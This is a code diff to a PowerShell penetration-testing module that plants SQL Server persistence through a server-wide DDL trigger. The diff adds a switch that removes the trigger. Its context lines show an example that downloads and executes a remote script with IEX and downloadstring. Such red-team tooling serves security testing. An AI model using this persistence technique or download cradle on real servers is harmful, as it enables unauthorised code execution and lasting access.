@@ -27,6 +27,11 @@ function Invoke-SqlServer-Persist-TriggerDDL
 	from the internet and executes it.  The example shows the script being run as the current Windows user.
 
 	PS C:\> Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
+	
+	.EXAMPLE
+	Remove evil_DDL_trigger as the current Windows user.
+
+	PS C:\> Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove
 
 	.LINK
 	http://www.netspi.com
@@ -35,7 +40,7 @@ function Invoke-SqlServer-Persist-TriggerDDL
 	.NOTES
 	Author: Scott Sutherland - 2016, NetSPI
 	Version: Invoke-SqlServer-Persist-TriggerDDL.psm1 v1.0
-	Comment:  The trigger can be removed with the TSQL Below.
+	Comment:  The trigger can be removed manually with the TSQL Below.
 	USE master
 	DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
     #>
@@ -73,8 +78,11 @@ function Invoke-SqlServer-Persist-TriggerDDL
 
     [Parameter(Mandatory=$true,
     HelpMessage='Set target SQL Server instance.')]
-    [string]$SqlServerInstance
-    
+    [string]$SqlServerInstance,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
+    [Switch]$Remove
   )
 
     # -----------------------------------------------
@@ -387,6 +395,35 @@ function Invoke-SqlServer-Persist-TriggerDDL
     }else{
         Write-Host "[*] No options were provided." -foreground "red"
     }
+
+    # -------------------------------------------------------
+    # REmove DDL trigger 
+    # -------------------------------------------------------
+    if($Remove){
+
+        # Status user
+        Write-Host "[*] Removing trigger named evil_DDL_trigger..." 
+
+        # ---------------------------
+        # Create procedure
+        # ---------------------------
+
+        # Open db connection
+        $conn.Open()
+
+        # Setup query 
+        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
+        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER"
+
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader() 
+        
+        # Close db connection
+        $conn.Close()
+
+        Write-Host "[*] The evil_ddl_trigger trigger has been been removed." -foreground "green"
+    }
+
     Write-Host "[*] All done."
 }
 
